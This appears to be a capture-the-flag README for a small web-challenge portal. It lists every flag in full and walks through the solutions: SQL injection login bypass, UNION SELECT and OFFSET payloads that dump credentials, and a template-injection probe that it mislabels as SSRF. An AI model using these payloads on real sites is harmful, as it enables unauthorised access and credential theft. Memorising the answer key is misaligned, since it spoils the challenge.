My first portal
===============

A series of simple web challenges.

Text
----
I was bored during covid so I decided to create a portal for my friends and I to talk over (who even
uses facebook?). My friends think I'm a bad coder so prove them wrong for me &#x1F643;

Flag format: `FLAG{number_...}`. Be sure to submit the right flag under the right question!

Flags
-----
- FLAG{0_jUsT_ch3ck1ng_th3t_y0u_aR3_r3ading_th3_c0mM3ntS_PyEW_SHVNtE}
- FLAG{1_i_suCc3ssFul1y_sQl_inJ3cted_l0g1n_hFjqJtqW-cQ}
- FLAG{2_pl81n_t3xt_0ffeNd3rS_T6RjMLt0y20}
- FLAG{3_un1ON_s3le3t_l3v3l_eQu3ls_admin_WmawnMIausw}
- FLAG{4_y0uV3_tRanSc3nded_sH3lL_AnD_t1Me_c6Rc-vuHsxI}

Walkthrough
-----------

### flag 0
HTML comments when you load up the admin page.

### flag 1
SQL inject the login page. Solution: `' OR 1=1 -- `

### flag 2
There is a profile page, which displays the username and passwords of the users in the system. By
SQLiing offset, we are able to get to our desired user. Solution: `' OR 1=1 LIMIT 1 OFFSET 3 -- `

### flag 3
We can use a union select. Solution: `' OR 1=0 UNION SELECT '1', '1', 'admin' -- `

### flag 4
The profile template is vulnerable to SSRF. This can be seen by injecting 
`' OR 1=0 UNION SELECT 'admin', '{{ config }}', 'admin' -- ` into the username field. We can then
use that to open and read the flag file. Solution: left to the reader.